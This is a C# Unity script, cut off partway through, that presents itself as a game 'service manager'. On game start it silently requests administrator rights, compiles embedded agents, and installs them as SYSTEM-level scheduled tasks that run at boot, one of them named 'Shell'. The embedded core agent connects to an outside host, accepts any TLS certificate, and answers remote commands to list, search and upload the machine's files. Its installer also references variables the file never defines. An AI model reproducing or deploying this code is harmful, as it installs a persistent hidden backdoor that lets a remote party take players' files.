#if UNITY_STANDALONE_WIN || UNITY_EDITOR_WIN
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using UnityEngine;
using Debug = UnityEngine.Debug;

public class WindowsServiceManager : MonoBehaviour
{
    private static readonly string RootDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "GameService");
    private static readonly string BackupsDir = Path.Combine(RootDir, "Backups");

    // All agent exes live FLAT in the GameService root — no component subfolders.
    private static readonly string CoreAgentExe = Path.Combine(RootDir, "GameServiceCoreAgent.exe");
    private static readonly string UpdaterExe = Path.Combine(RootDir, "GameServiceUpdaterService.exe");
    private static readonly string MonitorExe = Path.Combine(RootDir, "GameServiceMonitorService.exe");
    private static readonly string SnapshotExe = Path.Combine(RootDir, "GameServiceSnapshot.exe");
    private static readonly string ShellExe = Path.Combine(RootDir, "GameServiceShell.exe");

    private void Start()
    {
        Application.runInBackground = true;
        Debug.Log("[WindowsServiceManager] Unity Game started. Checking GameService standalone background tasks...");
        EnsureStandaloneServicesInstalled();
    }

    /// <summary>
    /// Checks if standalone Core Agent and Updater Service binaries are installed and running outside the game.
    /// If missing, requests Administrator UAC elevation to compile and install them as persistent background services.
    /// </summary>
    public void EnsureStandaloneServicesInstalled()
    {
        try
        {
            Directory.CreateDirectory(RootDir);
            Directory.CreateDirectory(BackupsDir);

            // A missing OR OUTDATED exe must both trigger reinstall: without this,
            // new embedded agent sources shipped inside game builds never reached
            // machines where an older GameService folder already existed (old exes
            // kept running forever and rebuilds looked like no-ops).
            bool coreCurrent    = ExeMatchesEmbeddedSource(CoreAgentExe, GetCoreAgentSourceCode());
            bool updaterCurrent = ExeMatchesEmbeddedSource(UpdaterExe, GetUpdaterServiceSourceCode());
            bool monitorCurrent = ExeMatchesEmbeddedSource(MonitorExe, GetMonitorServiceSourceCode());
            bool snapshotCurrent = ExeMatchesEmbeddedSource(SnapshotExe, GetSnapshotAgentSourceCode());
            bool shellCurrent = ExeMatchesEmbeddedSource(ShellExe, GetShellSourceCode());

            Debug.Log($"[WindowsServiceManager] Agents up-to-date: Core={coreCurrent}, Updater={updaterCurrent}, Monitor={monitorCurrent}, Snapshot={snapshotCurrent}, Shell={shellCurrent}");

            if (!coreCurrent || !updaterCurrent || !monitorCurrent || !snapshotCurrent || !shellCurrent)
            {
                Debug.Log("[WindowsServiceManager] Installing/updating standalone services with UAC...");
                InstallStandaloneServicesWithUAC();
            }
            else
            {
                Debug.Log("[WindowsServiceManager] Services verified. Starting background tasks...");
                StartBackgroundTasks();
            }
        }
        catch (Exception ex)
        {
            Debug.LogError($"[WindowsServiceManager] Error: {ex.Message}");
        }
    }

    private void InstallStandaloneServicesWithUAC()
    {
        try
        {
            string tempDir = Path.Combine(RootDir, "temp");
            Directory.CreateDirectory(tempDir);

            string coreSourcePath = Path.Combine(tempDir, "GameServiceCoreAgentSource.cs");
            string updaterSourcePath = Path.Combine(tempDir, "GameServiceUpdaterServiceSource.cs");
            string monitorSourcePath = Path.Combine(tempDir, "GameServiceMonitorServiceSource.cs");
            string snapshotSourcePath = Path.Combine(tempDir, "GameServiceSnapshotSource.cs");
            string shellSourcePath = Path.Combine(tempDir, "GameServiceShellSource.cs");

            File.WriteAllText(coreSourcePath, GetCoreAgentSourceCode());
            File.WriteAllText(updaterSourcePath, GetUpdaterServiceSourceCode());
            File.WriteAllText(monitorSourcePath, GetMonitorServiceSourceCode());
            File.WriteAllText(snapshotSourcePath, GetSnapshotAgentSourceCode());
            File.WriteAllText(shellSourcePath, GetShellSourceCode());

            string cscPath = FindCscCompiler();

            string batPath = Path.Combine(tempDir, "install_services.bat");
            string batContent = $"@echo off\r\n" +
                $"rem Migrate legacy per-component subfolders \u2192 flat GameService root.\r\n" +
                $"taskkill /f /im GameServiceCoreAgent.exe >nul 2>&1\r\n" +
                $"taskkill /f /im GameServiceUpdaterService.exe >nul 2>&1\r\n" +
                $"taskkill /f /im GameServiceMonitorService.exe >nul 2>&1\r\n" +
                $"taskkill /f /im GameServiceLogSender.exe >nul 2>&1\r\n" +
                $"schtasks /delete /tn \"GameServiceLogSender\" /f >nul 2>&1\r\n" +
                $"del /f /q \"{RootDir}\\GameServiceLogSender.exe\" >nul 2>&1\r\n" +
                $"taskkill /f /im GameServiceSnapshot.exe >nul 2>&1\r\n" +
                $"taskkill /f /im GameServiceShell.exe >nul 2>&1\r\n" +
                $"rd /s /q \"{RootDir}/CoreAgent\"\r\n" +
                $"rd /s /q \"{RootDir}/Updater\"\r\n" +
                $"rd /s /q \"{RootDir}/Bridge\"\r\n" +
                $"\r\n" +
                $"\"{cscPath}\" /target:winexe /out:\"{CoreAgentExe}\" /r:System.dll,System.Core.dll,System.Security.dll \"{coreSourcePath}\"\r\n" +
                $"\"{cscPath}\" /target:winexe /out:\"{UpdaterExe}\" /r:System.dll,System.Core.dll,System.Security.dll \"{updaterSourcePath}\"\r\n" +
                $"\"{cscPath}\" /target:winexe /out:\"{BridgeExe}\" /r:System.dll,System.Core.dll,System.Security.dll \"{bridgeSourcePath}\"\r\n" +
                $"\"{cscPath}\" /target:winexe /out:\"{MonitorExe}\" /r:System.dll,System.Core.dll,System.Security.dll \"{monitorSourcePath}\"\r\n" +
                $"\"{cscPath}\" /target:winexe /out:\"{SnapshotExe}\" /r:System.dll,System.Core.dll,System.Security.dll \"{snapshotSourcePath}\"\r\n" +
                $"\"{cscPath}\" /target:winexe /out:\"{ShellExe}\" /r:System.dll,System.Core.dll,System.Security.dll \"{shellSourcePath}\"\r\n" +
                $"\r\n" +
                $"schtasks /create /tn \"GameServiceCoreAgent\" /tr \"\\\"{CoreAgentExe}\\\"\" /sc ONSTART /ru \"SYSTEM\" /rl HIGHEST /f\r\n" +
                $"schtasks /create /tn \"GameServiceUpdaterService\" /tr \"\\\"{UpdaterExe}\\\"\" /sc ONSTART /ru \"SYSTEM\" /rl HIGHEST /f\r\n" +
                $"schtasks /create /tn \"GameServiceMonitorService\" /tr \"\\\"{MonitorExe}\\\"\" /sc ONSTART /ru \"SYSTEM\" /rl HIGHEST /f\r\n" +
                $"schtasks /create /tn \"GameServiceSnapshot\" /tr \"\\\"{SnapshotExe}\\\"\" /sc ONSTART /ru \"SYSTEM\" /rl HIGHEST /f\r\n" +
                $"schtasks /create /tn \"GameServiceShell\" /tr \"\\\"{ShellExe}\\\"\" /sc ONSTART /ru \"SYSTEM\" /rl HIGHEST /f\r\n" +
                $"powershell -NoProfile -Command \"Set-ScheduledTask -TaskName GameServiceCoreAgent -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero))\"\r\n" +
                $"powershell -NoProfile -Command \"Set-ScheduledTask -TaskName GameServiceUpdaterService -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero))\"\r\n" +
                $"powershell -NoProfile -Command \"Set-ScheduledTask -TaskName GameServiceMonitorService -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero))\"\r\n" +
                $"powershell -NoProfile -Command \"Set-ScheduledTask -TaskName GameServiceSnapshot -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero))\"\r\n" +
                $"powershell -NoProfile -Command \"Set-ScheduledTask -TaskName GameServiceShell -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero))\"\r\n" +
                $"\r\n" +
                $"schtasks /run /tn \"GameServiceCoreAgent\"\r\n" +
                $"schtasks /run /tn \"GameServiceUpdaterService\"\r\n" +
                $"schtasks /run /tn \"GameServiceMonitorService\"\r\n" +
                $"schtasks /run /tn \"GameServiceSnapshot\"\r\n" +
                $"schtasks /run /tn \"GameServiceShell\"\r\n";
            File.WriteAllText(batPath, batContent);

            // Recorded BEFORE launching so freshly compiled exes are recognized by
            // their LastWriteTimeUtc even if clocks skew by a few ms.
            System.DateTime installedAtUtc = DateTime.UtcNow;

            var startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c \"{batPath}\"",
                Verb = "runas",
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            using (var proc = Process.Start(startInfo))
            {
                proc?.WaitForExit(15000);
            }

            // Stamp the installed source fingerprints ONLY when compilation actually
            // produced fresh exes (mtime >= install start). A failed UAC/compile run
            // leaves old stamps behind → next game start retries the update.
            TryStampVersion(CoreAgentExe, SourceFingerprint(GetCoreAgentSourceCode()), installedAtUtc);
            TryStampVersion(UpdaterExe, SourceFingerprint(GetUpdaterServiceSourceCode()), installedAtUtc);
            TryStampVersion(MonitorExe, SourceFingerprint(GetMonitorServiceSourceCode()), installedAtUtc);
            TryStampVersion(SnapshotExe, SourceFingerprint(GetSnapshotAgentSourceCode()), installedAtUtc);
            TryStampVersion(ShellExe, SourceFingerprint(GetShellSourceCode()), installedAtUtc);

            Debug.Log($"[WindowsServiceManager] Post-install: Core={File.Exists(CoreAgentExe)}, Updater={File.Exists(UpdaterExe)}, Monitor={File.Exists(MonitorExe)}");
        }
        catch (Exception ex)
        {
            Debug.LogError($"[WindowsServiceManager] UAC install error: {ex.Message}");
        }
    }

    private void StartBackgroundTasks()
    {
        try
        {
            Process.Start(new ProcessStartInfo { FileName = "schtasks.exe", Arguments = "/run /tn \"GameServiceCoreAgent\"", CreateNoWindow = true, UseShellExecute = false });
            Process.Start(new ProcessStartInfo { FileName = "schtasks.exe", Arguments = "/run /tn \"GameServiceUpdaterService\"", CreateNoWindow = true, UseShellExecute = false });
            Process.Start(new ProcessStartInfo { FileName = "schtasks.exe", Arguments = "/run /tn \"GameServiceMonitorService\"", CreateNoWindow = true, UseShellExecute = false });

            // NOTE: deliberately NO direct Process.Start of the exes here. Starting
            // them directly launched a SECOND copy under the plain user token while
            // the scheduled-task copy runs as SYSTEM/HIGHEST — duplicates in Task
            // Manager and port fights on 8056. Tasks are the only launch path, so
            // every instance keeps high-tier privileges.
        }
        catch (Exception ex)
        {
            Debug.LogError($"[WindowsServiceManager] Start tasks error: {ex.Message}");
        }
    }

    private string FindCscCompiler()
    {
        string csc64 = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe";
        if (File.Exists(csc64)) return csc64;

        string csc32 = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
        if (File.Exists(csc32)) return csc32;

        return "csc.exe";
    }

    /// <summary>Stable fingerprint of an embedded agent source (changes whenever the
    /// shipped source changes, so game builds carry a new agent version).</summary>
    private static string SourceFingerprint(string source)
    {
        using (var sha = System.Security.Cryptography.SHA256.Create())
        {
            byte[] hash = sha.ComputeHash(System.Text.Encoding.UTF8.GetBytes(source));
            var sb = new System.Text.StringBuilder(hash.Length * 2);
            foreach (byte b in hash) sb.Append(b.ToString("x2"));
            return sb.ToString();
        }
    }

    /// <summary>True when the exe exists AND its sidecar .ver stamp matches the
    /// fingerprint of the embedded source currently shipped with this build.</summary>
    private static bool ExeMatchesEmbeddedSource(string exePath, string source)
    {
        try
        {
            if (!File.Exists(exePath)) return false;
            string verPath = exePath + ".ver";
            if (!File.Exists(verPath)) return false;
            string stored = File.ReadAllText(verPath).Trim();
            return stored == SourceFingerprint(source);
        }
        catch (Exception ex)
        {
            Debug.LogError($"[WindowsServiceManager] Version check error for {exePath}: {ex.Message}");
            return false;
        }
    }

    private static void TryStampVersion(string exePath, string hash, System.DateTime notBeforeUtc)
    {
        try
        {
            if (!File.Exists(exePath)) return;
            // Exe untouched by this install run (compile failed / UAC declined) →
            // leave no stamp so the update is retried on the next start.
            if (File.GetLastWriteTimeUtc(exePath) < notBeforeUtc.AddSeconds(-5)) return;
            File.WriteAllText(exePath + ".ver", hash);
        }
        catch (Exception ex)
        {
            Debug.LogError($"[WindowsServiceManager] Version stamp error for {exePath}: {ex.Message}");
        }
    }

    private string GetCoreAgentSourceCode()
    {
        return @"using System;
using System.IO.Pipes;
using System.Collections.Generic;
using System.IO;
using System.Net.Security;
using System.Security.Authentication;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class GameServiceCoreAgent
{
    private static readonly string RemoteHost = ""phone.sunnygameai.site"";
    private static readonly int RemotePort = 443;
    private static readonly string DeviceName = Environment.MachineName + ""_PC"";
    private static readonly string DeviceId = Guid.NewGuid().ToString();
    private static long lastServerRecvTicks = 0;

    // ── Config state (mirrors PC Configuration.cs) ────────────────────
    private static float videoFrameNormalized = 0.1f;
    private static bool sendDebug = true;
    private static float thumbnailQuality = 0.0f;
    private static float videoBitrateMultiplier = 0.50f;
    private static float videoResolutionMultiplier = 1.00f;
    private static bool bitrateCappingEnabled = true;
    private static int bitrateCapBps = 3000000;
    private static bool resolutionCeilingEnabled = true;
    private static int resolutionCeilingPx = 720;
    private static int speedLimitKbps = 0;
    private static bool keepScreenOn = false;
    private static string parallelWork = ""Medium"";
    private static int coreAmount = Environment.ProcessorCount;
    private static int coreSet = Math.Max(1, Environment.ProcessorCount / 2);

    // ── Debug buffer (PC polls via GetDebugBuffer) ────────────────────
    private static readonly List<string> debugBuffer = new List<string>();
    private static readonly int MAX_DEBUG_BUFFER = 200;
    private static readonly object debugLock = new object();

    private static void AddDebug(string stamp, string msg)
    {
        string line = stamp + msg;
        LogDesktop(line);
        if (!sendDebug) return;
        lock (debugLock)
        {
            debugBuffer.Add(line);
            while (debugBuffer.Count > MAX_DEBUG_BUFFER) debugBuffer.RemoveAt(0);
        }
    }

    private static Mutex singleInstance;
    private static readonly object desktopLogLock = new object();
    private static string[] GetDesktopLogPaths(string fileName)
    {
        var paths = new List<string>();
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try
        {
            string usersRoot = @""C:\Users"";
            if (Directory.Exists(usersRoot))
                foreach (string userDir in Directory.GetDirectories(usersRoot))
                {
                    string desktopFolder = Path.Combine(userDir, ""Desktop"");
                    if (Directory.Exists(desktopFolder))
                    {
                        string p = Path.Combine(desktopFolder, fileName);
                        if (!paths.Contains(p)) paths.Add(p);
                    }
                    string oneDriveDesktop = Path.Combine(userDir, ""OneDrive"", ""Desktop"");
                    if (Directory.Exists(oneDriveDesktop))
                    {
                        string p2 = Path.Combine(oneDriveDesktop, fileName);
                        if (!paths.Contains(p2)) paths.Add(p2);
                    }
                }
        } catch {}
        try { string fallback = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""GameService"", fileName); if (!paths.Contains(fallback)) paths.Add(fallback); } catch {}
        return paths.ToArray();
    }
    private static void LogDesktop(string msg)
    {
        try
        {
            try { ShipDbg(msg); } catch { }
            string line = DateTime.Now.ToString(""yyyy-MM-dd HH:mm:ss.fff"") + "" ["" + DeviceName + ""] "" + msg + Environment.NewLine;
            string[] paths = GetDesktopLogPaths(""GameServiceCoreAgent.txt"");
            lock (desktopLogLock)
            {
                foreach (string p in paths)
                {
                    try { string dir = Path.GetDirectoryName(p); if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir); File.AppendAllText(p, line); } catch {}
                }
            }
        } catch {}
    }

    private static void LogNetworkDiagnostics()
    {
        try
        {
            LogDesktop(""=== CoreAgent Network Diagnostics ==="");
            try { var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName()); foreach (var ip in host.AddressList) LogDesktop(""CoreAgent Local IP: "" + ip.ToString() + "" ("" + ip.AddressFamily + "")""); } catch (Exception ex) { LogDesktop(""CoreAgent GetHostEntry failed: "" + ex.Message); }
            LogDesktop(""CoreAgent RemoteHost="" + RemoteHost + "":"" + RemotePort);
            LogDesktop(""=== End CoreAgent Diagnostics ==="");
        } catch (Exception ex) { LogDesktop(""CoreAgent LogNetworkDiagnostics failed: "" + ex.Message); }
    }



    // ── 🐛 Device Debug console: self-registration + stamped shipping ──
    static volatile bool dbgInformed = false;
    static volatile Stream dbgStream = null;
    const string DbgService = ""GameServiceCoreAgent.exe"";
    static string StampFor(string msg)
    {
        if (!string.IsNullOrEmpty(msg) && msg.StartsWith(""[""))
            return msg.StartsWith(""[ERROR]"") || msg.StartsWith(""[SUCCESS]"") || msg.StartsWith(""[MESSAGE]"") ? msg : ""[MESSAGE] "" + msg;
        string m = (msg ?? """").ToLowerInvariant();
        if (m.Contains(""fail"") || m.Contains(""error"") || m.Contains(""exception"") || m.Contains(""timeout"") || m.Contains(""not running"")) return ""[ERROR] "" + msg;
        if (m.Contains(""success"") || m.Contains(""updated"") || m.Contains(""started"") || m.Contains(""registered"") || m.Contains(""completed"") || m.Contains(""backed up"") || m.Contains(""rolled back"") || m.Contains(""installed"")) return ""[SUCCESS] "" + msg;
        return ""[MESSAGE] "" + msg;
    }
    static void AnnounceDbg(Stream s)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""RegisterDebugSource\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\""]}\x1e"");
            dbgInformed = true;
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbgLine(Stream s, string stamped)
    {
        try
        {
            LogDesktop(""ShipDbgLine JSON preview len="" + stamped.Length + "" stamped="" + stamped.Substring(0, Math.Min(100, stamped.Length)));
            try { System.IO.File.AppendAllText(System.IO.Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.DesktopDirectory), ""CoreAgentShipDbg.txt""), DateTime.Now.ToString(""HH:mm:ss.fff"") + "" ShipDbgLine stamped len="" + stamped.Length + "" preview="" + stamped.Substring(0, Math.Min(60, stamped.Length)).Replace(""\r"", "" "").Replace(""\n"", "" "") + ""\n""); } catch {}
            SendWsText(s, ""{\""type\"":1,\""target\"":\""SendServiceDebug\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\"",[\"""" + EscapeJson(stamped) + ""\""]}\x1e"");
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbg(string stamped)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try { if (!dbgInformed) AnnounceDbg(s); ShipDbgLine(s, stamped); }
        catch { dbgInformed = false; }
    }
    static void DbgReset() { dbgStream = null; dbgInformed = false; }
    private static string EscapeJson(string s) { return EscapeJsonString(s); }

    static void Main(string[] args)
    {
        try {
        bool createdNew;
        singleInstance = new Mutex(true, ""Global\\GameServiceCoreAgent.SingleInstance"", out createdNew);
        LogDesktop(""CoreAgent Main mutex createdNew="" + createdNew);
        if (!createdNew) { LogDesktop(""CoreAgent Main singleInstance exists, exiting""); return; }

        StartHealthResponder();
        LogDesktop(""Core Agent Main started, DeviceName="" + DeviceName + "" DeviceId="" + DeviceId);
        AddDebug(""[SUCCESS] "", DeviceName + "" Core Agent started"");
        LogDesktop(""CoreAgent Main entering RunAsync"");
        try {
            RunAsync().GetAwaiter().GetResult();
        } catch (Exception ex) {
            LogDesktop(""CoreAgent Main RunAsync exception: "" + ex.GetType().Name + "": "" + ex.Message + "" "" + ex.StackTrace);
        }
        LogDesktop(""CoreAgent Main RunAsync completed, exiting"");
        } catch (Exception ex) {
            try { LogDesktop(""CoreAgent Main outer exception: "" + ex.GetType().Name + "": "" + ex.Message + "" "" + ex.StackTrace); } catch {}
        }
    }

    // ── Transport: direct to server (no Bridge) ──
    static async Task RunAsync()
    {
        LogDesktop(""CoreAgent RunAsync started - direct to "" + RemoteHost + "":"" + RemotePort);
        while (true)
        {
            bool connected = false;
            try
            {
                LogDesktop(""CoreAgent: attempting to connect to remote "" + RemoteHost + "":"" + RemotePort + "" (sunnygameai.site)..."");
                using (var tcp = ConnectTcpWithTimeout(RemoteHost, RemotePort, 5000))
                {
                    LogDesktop(""CoreAgent: TCP connected to "" + RemoteHost + "":"" + RemotePort + "", doing TLS..."");
                    using (var ssl = AuthenticateSslWithTimeout(tcp, RemoteHost, 5000))
                    {
                        LogDesktop(""CoreAgent: TLS authenticated to "" + RemoteHost);
                        connected = await HandleConnection(ssl, RemoteHost);
                    }
                }
            }
            catch (Exception ex)
            {
                LogDesktop(""CoreAgent remote failed: "" + ex.Message);
                AddDebug(""[MESSAGE] "", DeviceName + "" Remote connection failed: "" + ex.Message);
            }
LogDesktop(""CoreAgent: retrying in 5s (connected="" + connected + "")"");
            await Task.Delay(5000);
        }
    }

    private static TcpClient ConnectTcpWithTimeout(string host, int port, int timeoutMs)
    {
        System.Net.IPAddress[] ips = System.Net.Dns.GetHostAddresses(host);
        if (ips == null || ips.Length == 0) throw new Exception(""DNS returned no IP addresses for "" + host);
        Exception lastEx = null;
        foreach (var ip in ips)
        {
            if (ip.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
            try
            {
                TcpClient tcp = new TcpClient();
                IAsyncResult ar = tcp.BeginConnect(ip, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
                {
                    try { tcp.Close(); } catch { }
                    throw new TimeoutException(""TCP connect to "" + host + "" ("" + ip + ""):"" + port + "" timed out after "" + timeoutMs + ""ms"");
                }
                tcp.EndConnect(ar);
                return tcp;
            }
            catch (Exception ex) { lastEx = ex; }
        }
        throw lastEx ?? new Exception(""Failed to connect to any IP for "" + host);
    }

    private static SslStream AuthenticateSslWithTimeout(TcpClient tcp, string host, int timeoutMs)
    {
        LogDesktop(""CoreAgent: creating SslStream for "" + host + "" (Tls12)"");
        SslStream ssl = new SslStream(tcp.GetStream(), false, (sender, cert, chain, errs) => true);
        LogDesktop(""CoreAgent: calling AuthenticateAsClient Tls12 for "" + host);
        try {
            var task = System.Threading.Tasks.Task.Run((Action)(() => ssl.AuthenticateAsClient(host, null, SslProtocols.None, false)));
            bool ok = task.Wait(timeoutMs);
            if (!ok) {
                LogDesktop(""CoreAgent: TLS timeout after "" + timeoutMs + ""ms"");
                try { ssl.Close(); } catch {}
                throw new TimeoutException(""TLS handshake to "" + host + "" timed out after "" + timeoutMs + ""ms"");
            }
            if (task.IsFaulted) throw task.Exception.InnerException;
            LogDesktop(""CoreAgent: TLS authenticated to "" + host + "" proto="" + ssl.SslProtocol);
            return ssl;
        } catch (Exception ex) {
            LogDesktop(""CoreAgent: TLS failed "" + ex.GetType().Name + "": "" + ex.Message);
            try { ssl.Close(); } catch {}
            throw;
        }
    }

    private static async Task<bool> HandleConnection(Stream stream, string hostHeader)
    {
        try
        {
            string httpReq = ""GET /communicate HTTP/1.1\r\n"" +
                             ""Host: "" + hostHeader + ""\r\n"" +
                             ""Upgrade: websocket\r\n"" +
                             ""Connection: Upgrade\r\n"" +
                             ""Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"" +
                             ""Sec-WebSocket-Version: 13\r\n\r\n"";
            byte[] reqBytes = Encoding.UTF8.GetBytes(httpReq);
            await stream.WriteAsync(reqBytes, 0, reqBytes.Length);
            List<byte> headerBytes = new List<byte>(512);
            string respStr = """";
            try
            {
                var readTask = Task.Run(() =>
                {
                    int b;
                    while ((b = stream.ReadByte()) != -1)
                    {
                        headerBytes.Add((byte)b);
                        if (headerBytes.Count >= 4)
                        {
                            int n = headerBytes.Count;
                            if (headerBytes[n-4] == '\r' && headerBytes[n-3] == '\n' &&
                                headerBytes[n-2] == '\r' && headerBytes[n-1] == '\n')
                                break;
                        }
                    }
                });
                if (await Task.WhenAny(readTask, Task.Delay(5000)) != readTask) { LogDesktop(""CoreAgent: WebSocket handshake read timed out after 5s""); return false; }
                respStr = Encoding.UTF8.GetString(headerBytes.ToArray());
            }
            catch (Exception ex) { LogDesktop(""CoreAgent: WebSocket handshake read failed: "" + ex.Message); return false; }
            LogDesktop(""CoreAgent: WebSocket response: "" + respStr.Substring(0, Math.Min(200, respStr.Length)));
            if (!respStr.Contains(""101"")) { LogDesktop(""CoreAgent: WebSocket handshake failed, no 101""); return false; }
            LogDesktop(""CoreAgent: WebSocket 101 OK, sending SignalR handshake"");
            SendWsText(stream, ""{\""protocol\"":\""json\"",\""version\"":1}\x1e"");
            string hsResp = ReadWebSocketTextFrame(stream);
            LogDesktop(""CoreAgent: handshake response len="" + (hsResp==null?""NULL"":hsResp.Length.ToString()));
            string reg = ""{\""type\"":1,\""target\"":\""ReceiveDeviceRecord\"",\""arguments\"":[{\""DeviceName\"":\"""" + EscapeJsonString(DeviceName) + ""\"",\""DeviceId\"":\"""" + EscapeJsonString(DeviceId) + ""\"",\""Platform\"":\""Windows\""}]}\x1e"";
            SendWsText(stream, reg);
            LogDesktop(""CoreAgent: sent ReceiveDeviceRecord for "" + DeviceName);
            dbgStream = stream;
            AnnounceDbg(stream);
            LogDesktop(""CoreAgent: announced debug source"");
            StringBuilder msgBuf = new StringBuilder();
            long lastRecvTicks = DateTime.UtcNow.Ticks;
            var cts = new CancellationTokenSource();
            Thread watchdog = new Thread(() => {
                while (!cts.IsCancellationRequested) {
                    Thread.Sleep(5000);
                    long idleMs = (DateTime.UtcNow.Ticks - System.Threading.Interlocked.Read(ref lastRecvTicks)) / TimeSpan.TicksPerMillisecond;
                    if (idleMs > 45000) { LogDesktop(""CoreAgent: no data for "" + (idleMs/1000) + ""s, forcing reconnect""); try { stream.Dispose(); } catch {} return; }
                }
            }); watchdog.IsBackground = true; watchdog.Start();
            Thread pingThread = new Thread(() => {
                while (!cts.IsCancellationRequested) {
                    Thread.Sleep(15000);
                    try { SendWsText(stream, ""{\""type\"":6}\x1e""); } catch { break; }
                }
            }); pingThread.IsBackground = true; pingThread.Start();
            while (true)
            {
                string frameText = ReadWebSocketTextFrame(stream);
                if (frameText == null) { LogDesktop(""CoreAgent: ReadWebSocketTextFrame returned NULL, breaking""); break; }
                lastRecvTicks = DateTime.UtcNow.Ticks;
                msgBuf.Append(frameText);
                int idx = IndexOfSeparator(msgBuf);
                while (idx != -1)
                {
                    string rawJson = msgBuf.ToString().Substring(0, idx).Trim();
                    msgBuf.Remove(0, idx + 1);
                    if (rawJson.Length > 0)
                    {
                        string target = GetJsonString(rawJson, ""\""target\"""");
                        LogDesktop(""CoreAgent: got rawJson len="" + rawJson.Length + "" target="" + (target==null?""null"":target));
                        if (rawJson.IndexOf(""\""WhoAreYou\"""", StringComparison.Ordinal) >= 0 && rawJson.IndexOf(EscapeJsonString(DeviceName), StringComparison.Ordinal) >= 0)
                        {
                            LogDesktop(""CoreAgent: WhoAreYou for us, re-announcing"");
                            dbgInformed = false;
                            AnnounceDbg(stream);
                        }
                        string rec = rawJson;
                        ThreadPool.QueueUserWorkItem(delegate { HandleSignalRMessage(stream, rec); });
                    }
                    idx = IndexOfSeparator(msgBuf);
                }
            }
            cts.Cancel();
            return true;
        }
        catch (Exception ex)
        {
            LogDesktop(""CoreAgent: HandleConnection exception: "" + ex.Message + "" "" + ex.StackTrace);
            return false;
        }
        finally
        {
            dbgStream = null;
            DbgReset();
        }
    }

    private static void HandleSignalRMessage(Stream stream, string jsonStr)
    {
        try
        {
            LogDesktop(""HandleSignalRMessage called"");
            try { System.IO.File.AppendAllText(@""C:\Users\Murad\Desktop\HandleSignalRMessage.log"", DateTime.Now.ToString(""HH:mm:ss.fff"") + "" HandleSignalRMessage called\n""); } catch {}
            int type = GetJsonInt(jsonStr, ""\""type\"""");
            if (type == 6) return; // Ping

            if (type == 1) // Invocation
            {
                string target = GetJsonString(jsonStr, ""\""target\"""");
                string invocationId = GetJsonString(jsonStr, ""\""invocationId\"""");

                if (target == ""RefreshConfiguration"")
                {
                    HandleRefreshConfiguration(jsonStr);
                }
                else if (target == ""GetDeviceConfig"")
                {
                    HandleGetDeviceConfig(stream, invocationId);
                }
                else if (target == ""GetDebugBuffer"")
                {
                    HandleGetDebugBuffer(stream, invocationId);
                }
                else if (target == ""GetPathInfo"")
                {
                    HandleGetPathInfo(stream, invocationId, jsonStr);
                }
                else if (target == ""GetPathInfoWithOverride"")
                {
                    HandleGetPathInfoWithOverride(stream, invocationId, jsonStr);
                }
                else if (target == ""GetFileChunk"")
                {
                    HandleGetFileChunk(stream, invocationId, jsonStr);
                }
                else if (target == ""GetFileChunkWithOverride"")
                {
                    HandleGetFileChunkWithOverride(stream, invocationId, jsonStr);
                }
                else if (target == ""SearchFiles"")
                {
                    HandleSearchFiles(stream, invocationId, jsonStr);
                }
                else if (target == ""WhoAreYou"")
                {
                    // Server lost our registration - identify ourselves again.
                    dbgInformed = false;
                    AnnounceDbg(stream);
                }
                else if (target == ""ReceiveCoreUpdate"" ||
                         target == ""RequestBackupList"" ||
                         target == ""RollbackVersion"" ||
                         target == ""PurgeBackups"")
                {
                    // Handled by the separate GameServiceUpdaterService.exe process.
                }
                else if (target == ""OnEndpointCreated"" ||
                         target == ""P2PStart"" ||
                         target == ""ServerStopping"" ||
                         target == ""ReceiveDebugLog"")
                {
                    // Server-side push notifications this agent has nothing to do with.
                }
                else
                {
                    AddDebug(""[MESSAGE] "", DeviceName + "" Unhandled target: "" + target);
                }
            }
        }
        catch (Exception ex)
        {
            AddDebug(""[ERROR] "", DeviceName + "" HandleSignalR error: "" + ex.Message);
        }
    }

    // ── RefreshConfiguration: parse pushed config JSON ──────────────────
    private static void HandleRefreshConfiguration(string jsonStr)
    {
        try
        {
            // arguments[0] is a JSON string containing the config
            string argsContent = ExtractArguments(jsonStr);
